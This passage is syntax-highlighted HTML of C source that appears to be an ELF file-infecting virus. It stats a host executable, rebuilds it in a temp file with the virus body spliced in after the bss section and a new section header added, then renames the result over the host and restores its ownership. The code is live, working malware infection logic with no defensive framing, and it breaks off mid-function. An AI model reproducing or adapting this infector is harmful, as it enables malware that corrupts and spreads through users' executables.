        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_fstat</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">st_buf</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bin_error</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* write the new virus */</span><span class="sc0">
</span><span class="sc1">/*  if (mktemp(tempname) == NULL) goto bin_error;
*/</span><span class="sc0">
    </span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_open</span><span class="sc10">(</span><span class="sc11">tempname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">O_WRONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_CREAT</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_EXCL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">st_buf</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">out</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bin_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">addlen2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">_strlen</span><span class="sc10">(</span><span class="sc11">DEBUG_STRING</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">addlen3</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addlen2</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen2</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">++</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">++</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc1">/*
    we use the ehdr later on
*/</span><span class="sc0">
    </span><span class="sc10">--</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">--</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">phdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">plen</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">bss</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">zero</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">_malloc</span><span class="sc10">(</span><span class="sc11">bss_len</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">zero</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">memzero</span><span class="sc10">(</span><span class="sc11">zero</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">zero</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">zero_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">zero</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">get_virus</span><span class="sc10">(),</span><span class="sc0"> </span><span class="sc11">VIRUS_LENGTH</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">VIRUS_LENGTH</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DEBUG_STRING</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">_strlen</span><span class="sc10">(</span><span class="sc11">DEBUG_STRING</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">_strlen</span><span class="sc10">(</span><span class="sc11">DEBUG_STRING</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">zero_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">bss</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_name</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_type</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SHT_PROGBITS</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_flags</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SHF_ALLOC</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">SHF_WRITE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_addr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_addr</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_link</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_info</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_addralign</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">newshdr</span><span class="sc10">.</span><span class="sc11">sh_entsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">newshdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0">
        </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">sh_link</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">sh_link</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_addr</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">_strlen</span><span class="sc10">(</span><span class="sc11">DEBUG_STRING</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(++</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">addlen3</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shstrndx</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc1">/*
    we've already added to the offset
*/</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_lseek</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_write</span><span class="sc10">(</span><span class="sc0">
            </span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">section</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc0">
        </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">bin</span><span class="sc10">.</span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">sh_size</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_rename</span><span class="sc10">(</span><span class="sc11">tempname</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_fchown</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">st_buf</span><span class="sc10">.</span><span class="sc11">st_uid</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">st_buf</span><span class="sc10">.</span><span class="sc11">st_gid</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">bin_error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">free_bin</span><span class="sc10">(&amp;</span><span class="sc11">bin</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">zero_error</span><span class="sc10">:</span><span class="sc0">
